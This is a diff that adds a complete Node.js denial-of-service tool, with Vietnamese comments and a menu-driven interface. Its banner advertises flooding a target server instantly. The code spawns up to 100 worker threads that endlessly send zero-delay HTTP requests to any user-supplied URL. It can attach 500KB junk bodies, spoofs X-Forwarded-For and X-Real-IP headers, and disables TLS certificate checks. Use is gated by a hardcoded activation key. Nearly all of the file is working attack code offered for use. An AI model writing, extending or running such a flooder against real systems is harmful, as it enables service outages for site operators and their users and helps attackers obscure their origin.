@@ -1,0 +1,316 @@
+// instant-flood-tool.js - FLOOD TỨC THÌ - NGẬP SERVER TRONG 1S
+// Cách chạy: node instant-flood-tool.js
+
+const fs = require('fs');
+const path = require('path');
+const readline = require('readline');
+const crypto = require('crypto');
+const http = require('http');
+const https = require('https');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+
+const CONFIG_FILE = path.join(__dirname, '.flood_config.enc');
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+const question = (q) => new Promise(resolve => rl.question(q, resolve));
+
+// ========== MÀU SẮC ==========
+const c = {
+  reset: '\x1b[0m', red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
+  blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m',
+  bgRed: '\x1b[41m', bgGreen: '\x1b[42m', bgBlue: '\x1b[44m', bold: '\x1b[1m'
+};
+
+function log(msg, color = 'reset') { console.log(`${c[color]}${msg}${c.reset}`); }
+function clearScreen() { console.clear(); }
+
+function showBanner() {
+  log(`
+╔═══════════════════════════════════════════════════════════════════════════════════════╗
+║                                                                                       ║
+║     💀 INSTANT FLOOD TOOL - NGẬP SERVER TỨC THÌ 💀                                   ║
+║     🚀 1000+ REQUEST/S - MULTI THREAD - KO DELAY                                    ║
+║     ⚡ FLOOD NGAY LẬP TỨC - NHẤN 1 LÀ BẮT ĐẦU                                       ║
+║                                                                                       ║
+╚═══════════════════════════════════════════════════════════════════════════════════════╝
+`, 'red');
+}
+
+// ========== MÃ HÓA ==========
+const SECRET_KEY = 'nguyendu_instant_flood_2024';
+function encrypt(text) {
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(SECRET_KEY.padEnd(32).slice(0,32)), iv);
+  let encrypted = cipher.update(text, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  return iv.toString('hex') + ':' + encrypted;
+}
+function decrypt(text) {
+  try {
+    const parts = text.split(':');
+    const iv = Buffer.from(parts[0], 'hex');
+    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(SECRET_KEY.padEnd(32).slice(0,32)), iv);
+    let decrypted = decipher.update(parts[1], 'hex', 'utf8');
+    decrypted += decipher.final('utf8');
+    return JSON.parse(decrypted);
+  } catch(e) { return null; }
+}
+function saveConfig(config) {
+  const encrypted = encrypt(JSON.stringify(config));
+  fs.writeFileSync(CONFIG_FILE, encrypted);
+  log('✓ ĐÃ LƯU CẤU HÌNH!', 'green');
+}
+function loadConfig() {
+  if (!fs.existsSync(CONFIG_FILE)) return null;
+  const encrypted = fs.readFileSync(CONFIG_FILE, 'utf8');
+  return decrypt(encrypted);
+}
+
+// ========== KIỂM TRA KEY ==========
+async function checkKey() {
+  log('\n🔑 NHẬP KEY KÍCH HOẠT FLOOD TỨC THÌ:', 'magenta');
+  const inputKey = await question('⚡ KEY: ');
+  if (inputKey === 'nguyendu') {
+    log('\n✓ KÍCH HOẠT THÀNH CÔNG! FLOOD NGAY!', 'green');
+    return true;
+  }
+  log('\n✗ KEY SAI!', 'red');
+  return false;
+}
+
+// ========== HEADER HỢP LỆ (KHÔNG LỖI TOKEN) ==========
+function cleanHeaderValue(value) {
+  return String(value).replace(/[^\x20-\x7E]/g, '').substring(0, 200);
+}
+
+function createHeaders(requestId) {
+  const userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
+  ];
+  
+  const ips = ['8.8.8.8', '1.1.1.1', '4.4.4.4', '5.5.5.5', '9.9.9.9'];
+  const fakeIP = ips[Math.floor(Math.random() * ips.length)];
+  
+  return {
+    'User-Agent': userAgents[requestId % userAgents.length],
+    'Accept': '*/*',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Cache-Control': 'no-cache',
+    'Pragma': 'no-cache',
+    'Connection': 'close',
+    'X-Forwarded-For': fakeIP,
+    'X-Real-IP': fakeIP,
+    'X-Request-ID': crypto.randomBytes(8).toString('hex')
+  };
+}
+
+// ========== TẠO PAYLOAD 500KB ==========
+function createPayload(requestId) {
+  return JSON.stringify({
+    id: requestId,
+    ts: Date.now(),
+    data: Buffer.alloc(500000, 'X').toString()
+  });
+}
+
+// ========== GỬI REQUEST KHÔNG CHỜ ==========
+function sendRequestFast(url, headers, payload) {
+  return new Promise((resolve) => {
+    const parsedUrl = new URL(url);
+    const options = {
+      hostname: parsedUrl.hostname,
+      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
+      path: parsedUrl.pathname + parsedUrl.search,
+      method: payload ? 'POST' : 'GET',
+      headers: headers,
+      timeout: 3000,
+      rejectUnauthorized: false
+    };
+    
+    const client = parsedUrl.protocol === 'https:' ? https : http;
+    const req = client.request(options, (res) => {
+      resolve({ status: res.statusCode });
+    });
+    
+    req.on('error', () => resolve({ status: 0 }));
+    req.on('timeout', () => { req.destroy(); resolve({ status: 0 }); });
+    
+    if (payload) req.write(payload);
+    req.end();
+  });
+}
+
+// ========== WORKER THREAD - FLOOD KHÔNG NGỪNG ==========
+if (!isMainThread) {
+  const { targetUrl, threadId, sendPayload, delay } = workerData;
+  let count = 0;
+  let success = 0;
+  
+  const interval = setInterval(async () => {
+    count++;
+    const headers = createHeaders(count);
+    let payload = null;
+    
+    if (sendPayload) {
+      payload = createPayload(count);
+    }
+    
+    const result = await sendRequestFast(targetUrl, headers, payload);
+    if (result.status > 0 && result.status < 500) success++;
+    
+    if (count % 100 === 0) {
+      parentPort.postMessage({ threadId, count, success });
+    }
+  }, delay);
+  
+  // Không bao giờ dừng
+}
+
+// ========== FLOOD TỨC THÌ ==========
+async function instantFlood(config) {
+  clearScreen();
+  showBanner();
+  
+  const targetUrl = `${config.url}${config.endpoint || '/'}`;
+  const numThreads = config.threads || 20;
+  const sendPayload = config.sendPayload || false;
+  const delay = config.delay || 0; // 0ms = flood tức thì
+  
+  log('\n💀 KÍCH HOẠT FLOOD TỨC THÌ 💀\n', 'red');
+  log(`  🎯 TARGET: ${targetUrl}`, 'yellow');
+  log(`  🧵 THREADS: ${numThreads} (song song)`, 'cyan');
+  log(`  ⚡ DELAY: ${delay}ms (0 = tối đa)`, 'magenta');
+  log(`  📦 PAYLOAD: ${sendPayload ? '500KB/req' : 'KHÔNG'}`, 'green');
+  log(`  🚀 TỐC ĐỘ DỰ KIẾN: ${(1000/(delay+1) * numThreads).toFixed(0)} req/s`, 'red');
+  log(`\n  ⚠️  NHẤN Ctrl+C ĐỂ DỪNG FLOOD\n`, 'yellow');
+  log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'cyan');
+  
+  let totalRequests = 0;
+  let totalSuccess = 0;
+  let isRunning = true;
+  const startTime = Date.now();
+  
+  // Khởi tạo workers
+  const workers = [];
+  for (let i = 0; i < numThreads; i++) {
+    const worker = new Worker(__filename, {
+      workerData: { targetUrl, threadId: i, sendPayload, delay }
+    });
+    
+    worker.on('message', (data) => {
+      totalRequests += data.count;
+      totalSuccess += data.success;
+    });
+    
+    workers.push(worker);
+  }
+  
+  // Hiển thị stats mỗi giây
+  const statsInterval = setInterval(() => {
+    if (!isRunning) return;
+    const elapsed = (Date.now() - startTime) / 1000;
+    const rps = (totalRequests / elapsed).toFixed(0);
+    const successRate = totalRequests > 0 ? ((totalSuccess / totalRequests) * 100).toFixed(1) : 0;
+    
+    process.stdout.write(`\r${c.green}✓${totalSuccess}${c.reset} | ${c.red}✗${totalRequests - totalSuccess}${c.reset} | 📊${totalRequests} req | 🚀${rps} req/s | ✅${successRate}%    `);
+  }, 1000);
+  
+  // Bắt Ctrl+C
+  const cleanup = () => {
+    if (!isRunning) return;
+    isRunning = false;
+    clearInterval(statsInterval);
+    workers.forEach(w => w.terminate());
+    const elapsed = (Date.now() - startTime) / 1000;
+    log(`\n\n📊 KẾT QUẢ FLOOD TỨC THÌ:`, 'yellow');
+    log(`  ✅ THÀNH CÔNG: ${totalSuccess}`, 'green');
+    log(`  ❌ THẤT BẠI: ${totalRequests - totalSuccess}`, 'red');
+    log(`  📈 TỔNG REQUEST: ${totalRequests}`, 'cyan');
+    log(`  🚀 TỐC ĐỘ TB: ${(totalRequests/elapsed).toFixed(0)} req/s`, 'magenta');
+    log(`  ⏱️ THỜI GIAN: ${elapsed.toFixed(1)}s`, 'yellow');
+    process.exit(0);
+  };
+  
+  process.on('SIGINT', cleanup);
+}
+
+// ========== SETUP NHANH ==========
+async function quickSetup() {
+  clearScreen();
+  showBanner();
+  log('\n⚡ SETUP FLOOD TỨC THÌ (10 GIÂY)\n', 'green');
+  
+  const url = await question('› URL target (VD: http://localhost:3000): ');
+  const endpoint = await question('› Endpoint (VD: /api, để trống = /): ');
+  const threads = await question('› Số luồng (10-100, mặc định 20): ');
+  const sendPayload = await question('› Gửi payload 500KB? (y/n, mặc định n): ');
+  const customDelay = await question('› Delay (ms, 0 = flood tức thì, mặc định 0): ');
+  
+  const config = {
+    url: url.replace(/\/$/, ''),
+    endpoint: endpoint || '/',
+    threads: Math.min(100, parseInt(threads) || 20),
+    sendPayload: sendPayload.toLowerCase() === 'y',
+    delay: parseInt(customDelay) || 0,
+    setupTime: new Date().toISOString()
+  };
+  
+  saveConfig(config);
+  log('\n✓ CẤU HÌNH ĐÃ LƯU! FLOOD NGAY!', 'green');
+  await question('\nNhấn Enter để tiếp tục...');
+  return config;
+}
+
+// ========== MENU ==========
+async function showMenu(config) {
+  clearScreen();
+  showBanner();
+  log('\n═══════════════════════════════════════════════════════════', 'cyan');
+  log('  🧪 CẤU HÌNH FLOOD HIỆN TẠI', 'white');
+  log('═══════════════════════════════════════════════════════════', 'cyan');
+  log(`  🎯 URL: ${config?.url || 'CHƯA SETUP'}${config?.endpoint || ''}`, 'yellow');
+  log(`  🧵 THREADS: ${config?.threads || 20} luồng song song`, 'cyan');
+  log(`  ⚡ DELAY: ${config?.delay || 0}ms (0 = tức thì)`, 'magenta');
+  log(`  📦 PAYLOAD: ${config?.sendPayload ? '500KB/request' : 'KHÔNG'}`, 'green');
+  log('═══════════════════════════════════════════════════════════\n', 'cyan');
+  
+  log('╔═════════════════════════════════════════════════════════╗', 'red');
+  log('║  1. 💀 FLOOD TỨC THÌ (NGẬP SERVER NGAY LẬP TỨC)       ║', 'red');
+  log('║  2. ⚡ CÀI ĐẶT TARGET                                 ║', 'green');
+  log('║  3. 🚪 THOÁT                                           ║', 'white');
+  log('╚═════════════════════════════════════════════════════════╝\n', 'red');
+}
+
+// ========== MAIN ==========
+(async () => {
+  clearScreen();
+  
+  if (!await checkKey()) {
+    rl.close();
+    process.exit(1);
+  }
+  
+  let config = loadConfig();
+  
+  while (true) {
+    await showMenu(config || {});
+    const choice = await question('⚡ CHỌN (1-3): ');
+    
+    if (choice === '1') {
+      if (!config) {
+        log('\n✗ CHƯA CÀI ĐẶT TARGET!', 'red');
+        await question('\nNhấn Enter để tiếp tục...');
+      } else {
+        await instantFlood(config);
+      }
+    } else if (choice === '2') {
+      config = await quickSetup();
+    } else if (choice === '3') {
+      log('\n👋 TẠM BIỆT!', 'yellow');
+      rl.close();
+      process.exit(0);
+    }
+  }
+})();
